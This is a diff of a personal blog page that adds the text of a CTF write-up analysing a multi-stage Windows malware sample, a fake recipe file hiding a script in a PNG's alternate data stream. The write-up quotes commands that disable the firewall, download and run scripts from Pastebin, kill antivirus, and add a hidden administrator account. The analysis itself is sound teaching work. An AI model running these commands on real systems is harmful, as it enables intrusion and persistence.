@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>An email from aunt Chloe - Writeup | Journal of Connar</title>
 <meta name="keywords" content="">
 <meta name="description" content="Starting the analysis
@@ -18,16 +18,16 @@ If we pay attention to the txt file, we will notice that it is actually a vbs sc
 
 What this script is doing is:">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/ctfwriteups/anemailfromauntchloe/">
+<link rel="canonical" href="https://connar.github.io/ctfwriteups/anemailfromauntchloe/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/ctfwriteups/anemailfromauntchloe/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/ctfwriteups/anemailfromauntchloe/">
 <noscript>
     <style>
         #theme-toggle,
@@ -64,7 +64,89 @@ What this script is doing is:">
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="An email from aunt Chloe - Writeup" />
+<meta property="og:description" content="Starting the analysis
+In this challenge we are provided with a .rar file. We can extract the following files from this archive:
+
+An image named “SantasVillage.png”
+A txt named “RecipeForClassicBreadStuffing.txt”
+
+If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code:
+
+
+What this script is doing is:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/anemailfromauntchloe/" /><meta property="article:section" content="ctfwriteups" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="An email from aunt Chloe - Writeup"/>
+<meta name="twitter:description" content="Starting the analysis
+In this challenge we are provided with a .rar file. We can extract the following files from this archive:
+
+An image named “SantasVillage.png”
+A txt named “RecipeForClassicBreadStuffing.txt”
+
+If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code:
+
+
+What this script is doing is:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Ctfwriteups",
+      "item": "https://connar.github.io/ctfwriteups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "An email from aunt Chloe - Writeup",
+      "item": "https://connar.github.io/ctfwriteups/anemailfromauntchloe/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "An email from aunt Chloe - Writeup",
+  "name": "An email from aunt Chloe - Writeup",
+  "description": "Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions. Try to craft the path for the png image. Try and execute a script named herfxmasgiftfreh.cmd found inside an ADS stream of the png file. This should raise some alarms about the script inside the ADS stream of the png image, so let’s start analyzing it. To get the contents of the hidden script inside the ADS stream, we can run the following command: After running the command “Get-Content –Path .\\VillageOfSanta.png -Stream herfxmasgiftfreh.cmd” we get the embedded .cmd script that seems to be obfuscated. Let’s save it to a separate file and start deobfuscating it.\nDeobfuscation The method of obfuscation here is called envar obfuscation. Basically the malware creates a set of characters and creates the code to be executed by taking individual characters from the defined list:\nAfter we are done deobfuscating the script (by replacing each expression with the corresponding character), we are met with the following script:\nThe script has a lot going on, but we should pay attention to only 3 suspicious parts. The first one is the one where the script tries to download a .bat file from Pastebin and then run it:\nnetsh firewall set opmode mode-disable powershell -command \"Invoke-Webrequest https://pastebin.com/raw/bLnD8FWX -outfile KillAVS.bat\" start KillAVS.bat If we visit this url, we are met with another obfuscated script:\nUpon deobfuscating it with the same method used previously, we end up with the following deobfuscated script:\nThis tried to stop all possible AV engines that may be installed on the system. Really interesting, but no flag here, so let’s move to the second suspicious url:\ncls powershell -Command \"Invoke-WebRequest https://pastebin.com/raw/ptkj3Ua5 -outFile ycynlog.cmd\" start /min ycynlog.cmd As before, another obfuscated script can be found by visiting the url:\nDeobfuscating once again the script with the same methodology, we end up with:\nAnother file being dropped… But this time its an executable. Maybe this is the end? Visiting the rentry link we end up with some hex values that match the header of an executable:\nThe script itself tries to decode them and save the bytes to an executable, so we should try and do the same. We can use cyberchef for that:\nSaving them as an .exe and opening the executable in IDA, we are met with the following contents:\nAfter looking around a bit in the functions, we are finally met with the flag:\nUINT AddUser() { WinExec( \"cmd.exe /c net user System_guest NHACK{4_7h3_23c02d_7h15_w45_4n_4c7u4l_m4lw4r3_54mpl3_s0_c0n92475!!} /add\"; 0); return WinExec(\"cmd.exe /c net localgroup administrators System_guest /add\"; 0); } ",
+  "wordCount" : "485",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/ctfwriteups/anemailfromauntchloe/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -82,7 +164,7 @@ What this script is doing is:">
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -108,42 +190,42 @@ What this script is doing is:">
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -154,7 +236,7 @@ What this script is doing is:">
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/ctfwriteups/">Ctfwriteups</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/ctfwriteups/">Ctfwriteups</a></div>
     <h1 class="post-title entry-hint-parent">
       An email from aunt Chloe - Writeup
     </h1>
@@ -233,7 +315,7 @@ What this script is doing is:">
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="next" href="http://localhost:1313/ctfwriteups/ancientcavevault/">
+  <a class="next" href="https://connar.github.io/ctfwriteups/ancientcavevault/">
     <span class="title">Next »</span>
     <br>
     <span>Ancient Cave Vault - Writeup</span>
@@ -245,7 +327,7 @@ What this script is doing is:">
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
